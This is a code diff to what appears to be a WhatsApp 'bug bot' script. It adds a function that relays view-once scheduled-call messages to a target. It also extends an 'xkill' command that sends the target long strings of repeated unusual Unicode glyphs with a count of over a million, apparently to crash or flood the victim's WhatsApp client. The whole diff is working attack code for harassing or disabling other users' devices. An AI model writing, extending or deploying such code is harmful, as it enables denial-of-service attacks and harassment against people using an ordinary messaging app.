@@ -797,7 +797,27 @@ async function beta(quote, target) {
     });
   }
 }; 
-	
+
+async function callbg(jid) {
+	let etc = generateWAMessageFromContent(
+		jid,
+		proto.Message.fromObject({
+			viewOnceMessage: {
+				message: {
+					scheduledCallCreationMessage: {
+						scheduledTimestampMs: Date.now(),
+						callType: 2,
+						title: ""
+					}
+				}
+			},
+		}), {
+			userJid: jid
+		}
+	);
+	await XeonBotInc.relayMessage(jid, etc.message, {});
+}
+
         switch (command) {
 
 case 'xkill': {
@@ -811,7 +831,7 @@ await beta(betaq, target)
 await caros(target, Ptcp = true)
 await galx(target, Ptcp = true)
 await dott(target)
-await coresix()
+await coresix(target, "XBUG5𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱", 1020000, true); 
 await XeonBotInc.sendMessage(target, { text: `XBUG5𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱` }, {quoted: xbug2})
 await sleep(20000)
 }
